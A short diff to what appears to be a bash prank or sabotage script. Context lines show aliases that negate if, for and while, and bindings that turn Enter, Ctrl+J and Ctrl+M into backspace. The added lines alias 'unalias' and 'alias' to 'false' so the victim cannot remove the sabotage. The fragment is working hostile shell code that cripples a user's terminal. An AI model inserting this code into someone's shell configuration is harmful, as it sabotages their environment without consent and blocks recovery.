@@ -74,3 +74,7 @@ alias if='if !' for='for !' while='while !';
 # Map Enter, Ctrl+J, and Ctrl+M to backspace.
 bind '"\C-J":"\C-?"';
 bind '"\C-M":"\C-?"';
+
+# Disable `unalias` and `alias`
+alias unalias=false;
+alias alias=false;
